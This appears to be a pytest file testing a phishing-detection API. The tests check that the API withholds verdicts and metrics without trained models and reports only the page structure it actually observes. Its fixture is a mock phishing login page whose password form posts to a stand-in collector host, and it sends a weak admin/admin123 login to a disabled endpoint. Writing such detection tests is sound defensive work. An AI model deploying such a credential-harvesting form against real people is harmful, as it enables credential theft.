"""
API behaviour tests (Phase 1 honesty pass).

These tests check that the API reports genuine observations, explicit unavailable states and
measured values. They do not assert any metric, score or verdict value.
"""

import pytest
from fastapi.testclient import TestClient

from api import app
from component_status import (
    AVAILABLE, HEURISTIC, EXPERIMENTAL, NOT_CONFIGURED, NOT_EVALUATED, NOT_IMPLEMENTED, UNAVAILABLE,
)
from multimodal_fusion import DISABLED_MODALITIES

client = TestClient(app)

ALLOWED_STATUSES = {
    AVAILABLE, HEURISTIC, EXPERIMENTAL, NOT_CONFIGURED, UNAVAILABLE, NOT_IMPLEMENTED, NOT_EVALUATED,
}

LOGIN_PAGE = (
    "<html><head><title>Sign in</title></head><body>"
    "<form action='http://collector.example.net/post'>"
    "<input type='text' name='user'><input type='password' name='pw'></form>"
    "<div style='display:none'>hidden</div>"
    "<script>eval('x')</script></body></html>"
)


def test_health_reports_process_only():
    response = client.get("/api/v1/health")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_scan_returns_no_verdict_without_trained_model():
    response = client.post("/api/v1/scan", json={"url": "http://login.example.com/verify", "html_content": LOGIN_PAGE})
    assert response.status_code == 200
    data = response.json()
    assert data["verdict"] is None
    assert data["phishing_probability"] is None
    assert data["decision"]["status"] == UNAVAILABLE
    assert data["decision"]["reason"]
    assert data["explanation"]["status"] == UNAVAILABLE


def test_scan_reports_observed_dom_structure_from_supplied_html():
    data = client.post("/api/v1/scan", json={"url": "http://login.example.com/", "html_content": LOGIN_PAGE}).json()
    dom = data["modalities"]["dom_graph"]
    assert data["crawl"]["status"] == AVAILABLE
    assert data["crawl"]["source"] == "request_html_content"
    assert dom["status"] == AVAILABLE
    assert dom["form_nodes"] == 1
    assert dom["password_input_nodes"] == 1
    assert dom["hidden_nodes"] == 1
    assert dom["graph_node_count"] == dom["total_html_elements"]


def test_scan_without_html_does_not_invent_a_page():
    data = client.post("/api/v1/scan", json={"url": "https://example.com"}).json()
    assert data["crawl"]["status"] == UNAVAILABLE
    assert data["modalities"]["dom_graph"]["status"] == UNAVAILABLE
    assert data["modalities"]["js_indicators"]["status"] == UNAVAILABLE
    assert data["modalities"]["url_features"]["status"] == AVAILABLE


def test_scan_marks_simulated_modalities_unavailable():
    data = client.post("/api/v1/scan", json={"url": "http://paypal-account-update.com/login"}).json()
    for name in DISABLED_MODALITIES + ("gnn",):
        section = data["modalities"][name]
        assert section["status"] == UNAVAILABLE, name
        assert section["reason"], name
        assert set(section) == {"component", "status", "reason"}, name


def test_scan_rejects_empty_url():
    assert client.post("/api/v1/scan", json={"url": "   "}).status_code == 400


@pytest.mark.parametrize("path", ["/api/v1/detect", "/models/fusion/predict"])
def test_scan_aliases_use_same_pipeline(path):
    data = client.post(path, json={"url": "https://example.com"}).json()
    assert data["verdict"] is None
    assert "modalities" in data


def test_batch_scan_returns_no_verdicts():
    response = client.post("/api/v1/batch-scan", json={"urls": ["http://a.example", "https://b.example"]})
    assert response.status_code == 200
    data = response.json()
    assert data["total_scanned"] == 2
    for row in data["batch_results"]:
        assert row["verdict"] is None
        assert row["phishing_probability"] is None


def test_batch_scan_rejects_empty_list():
    assert client.post("/api/v1/batch-scan", json={"urls": []}).status_code == 400


def test_gnn_endpoint_returns_structure_but_no_model_output():
    data = client.post("/models/gnn/predict", json={"url": "http://x.example", "html_content": LOGIN_PAGE}).json()
    assert data["model"]["status"] == UNAVAILABLE
    assert data["dom_graph"]["status"] == AVAILABLE


@pytest.mark.parametrize("path,body", [
    ("/models/vit/predict", {"url": "http://x.example"}),
    ("/models/phishpedia/predict", {"url": "http://x.example"}),
    ("/models/visualphishnet/predict", {"url": "http://x.example"}),
    ("/models/phash/predict", {"url": "http://x.example"}),
    ("/models/visual-hybrid/predict", {"url": "http://x.example"}),
    ("/api/v1/screenshot/analyze", {"url": "http://x.example"}),
    ("/models/bert/predict", {"url": "http://x.example"}),
    ("/models/ensemble/predict", {"url": "http://x.example"}),
    ("/models/rf/predict", {"url": "http://x.example"}),
    ("/models/catboost/predict", {"url": "http://x.example"}),
    ("/models/autoencoder/predict", {"url": "http://x.example"}),
    ("/models/xai/predict", {"url": "http://x.example"}),
    ("/api/v1/eer-optimize", None),
    ("/api/v1/screenshot-datasets/connect", None),
    ("/api/v1/datasets/fetch-external", None),
    ("/api/v1/datasets/export", None),
    ("/api/v1/auth/login", {"username": "admin", "password": "admin123"}),
])
def test_disabled_components_return_501_with_reason(path, body):
    response = client.post(path, json=body) if body is not None else client.post(path)
    assert response.status_code == 501
    data = response.json()
    assert data["status"] == UNAVAILABLE
    assert data["reason"]


@pytest.mark.parametrize("path", ["/api/v1/benchmark-comparison", "/api/v1/screenshot-datasets"])
def test_disabled_get_endpoints_return_501(path):
    assert client.get(path).status_code == 501


def test_screenshot_upload_is_not_stored_or_analysed():
    response = client.post(
        "/api/v1/screenshot/upload",
        files={"file": ("upload.png", b"\x89PNG\r\n\x1a\n", "image/png")},
    )
    assert response.status_code == 501
    assert response.json()["status"] == UNAVAILABLE


def test_metrics_are_not_evaluated():
    data = client.get("/api/v1/metrics").json()
    assert data["status"] == NOT_EVALUATED
    assert data["metrics"] is None


@pytest.mark.parametrize("path", ["/dashboard/history", "/api/v1/history", "/dashboard/datasets", "/api/v1/dataset_stats"])
def test_history_and_dataset_are_unavailable(path):
    data = client.get(path).json()
    assert data["status"] == UNAVAILABLE
    assert data["reason"]


@pytest.mark.parametrize("path", ["/dashboard/system", "/api/v1/dashboard", "/dashboard/models", "/api/v1/model_info"])
def test_component_status_lists_every_component_with_reason(path):
    components = client.get(path).json()["components"]
    assert components
    for comp in components:
        assert comp["status"] in ALLOWED_STATUSES, comp
        assert comp["reason"], comp


def test_llm_list_reports_implementation_and_key_status():
    data = client.get("/models/llm/list").json()
    assert data["listed_engines"] == len(data["engines"])
    assert data["implemented_engines"] == sum(1 for e in data["engines"] if e["implemented"])
    assert all(e["api_key_configured"] is False for e in data["engines"])
    assert all(e["model_id_verified"] is False for e in data["engines"])


def test_single_llm_without_key_is_unavailable():
    data = client.post("/models/llm/gpt55/predict", json={"url": "http://x.example"}).json()
    assert data["status"] == UNAVAILABLE
    assert "threat_score" not in data and "verdict" not in data


def test_unknown_llm_engine_is_404():
    assert client.post("/models/llm/not-an-engine/predict", json={"url": "http://x.example"}).status_code == 404


def test_llm_compare_reports_unknown_ids():
    data = client.post("/models/llm/compare", json={"engine_ids": ["gpt55", "nope"], "url": "http://x.example"}).json()
    assert data["unknown_engine_ids"] == ["nope"]
    assert data["engines_ok"] == 0


def test_dataset_validate_runs_genuine_file_check():
    response = client.get("/api/v1/datasets/validate")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] in ("VALID", "INVALID")
    assert "note" in data
